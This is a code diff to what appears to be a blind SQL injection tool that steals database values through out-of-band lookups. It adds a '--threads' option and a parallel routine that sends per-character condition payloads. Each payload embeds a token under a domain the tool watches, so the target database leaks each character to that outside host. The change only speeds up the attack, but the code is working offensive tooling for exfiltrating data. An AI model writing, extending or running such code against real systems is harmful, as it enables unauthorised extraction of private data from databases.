@@ -6,6 +6,8 @@ import json
 import string
 import sys
 import uuid
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading as _threading
 from pathlib import Path
 
 from . import __version__
@@ -190,6 +192,53 @@ def check(args) -> int:
     return 0 if found else 1
 
 
+def _extract_value_parallel(args, profile, request, domain, log, run_id, session,
+                             extraction_id, expression, alphabet, max_len,
+                             partial_result, start_pos):
+    results: dict[int, str | None] = {}
+    positions = list(range(start_pos, max_len + 1))
+
+    def extract_one(pos: int) -> tuple[int, str | None]:
+        if getattr(args, "strategy", "batch") == "binary":
+            return pos, extract_char_binary(
+                args, profile, request, domain, log, run_id, expression, pos, alphabet
+            )
+        token_map: dict[str, str] = {}
+        for c in alphabet:
+            token = token_for(run_id, pos, c)
+            token_map[token] = c
+            condition = profile.condition(expression, pos, c)
+            payload = profile.payload(args.base, condition, f"{token}.{domain}")
+            send_payload(args, request, payload)
+        token = log.wait_any(token_map, args.timeout)
+        return pos, token_map[token] if token else None
+
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = {executor.submit(extract_one, pos): pos for pos in positions}
+        for fut in as_completed(futures):
+            pos, char = fut.result()
+            results[pos] = char
+
+    result = partial_result
+    for pos in range(start_pos, max_len + 1):
+        char = results.get(pos)
+        if not char:
+            break
+        result += char
+        session.save_extraction(
+            extraction_id, args.dbms, args.place, args.param,
+            expression, alphabet, result, False,
+        )
+        print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)
+
+    print(f"[+] done: {result}")
+    session.save_extraction(
+        extraction_id, args.dbms, args.place, args.param,
+        expression, alphabet, result, True,
+    )
+    return result
+
+
 def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     profile, request, domain, log, run_id, session = load_common(args)
     extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
@@ -214,6 +263,14 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     print(f"[+] domain: {domain}")
     print(f"[+] watching: {', '.join(args.log)}")
     print(f"[+] session: {session.path}")
+
+    if getattr(args, "threads", 1) > 1:
+        result = _extract_value_parallel(
+            args, profile, request, domain, log, run_id, session,
+            extraction_id, expression, alphabet, max_len, result, start_pos,
+        )
+        session.close()
+        return result
 
     for pos in range(start_pos, max_len + 1):
         if getattr(args, "strategy", "batch") == "binary":
@@ -545,6 +602,13 @@ def add_common(parser):
                         help="proxy URL: http://host:port or socks5://host:port")
     parser.add_argument("--no-verify-ssl", action="store_true",
                         help="skip SSL certificate verification")
+    parser.add_argument(
+        "--threads",
+        type=int,
+        default=1,
+        metavar="N",
+        help="parallel position extraction threads (default: 1; recommended: 2-4)",
+    )
     parser.add_argument("-v", "--verbose", action="store_true")
 
 
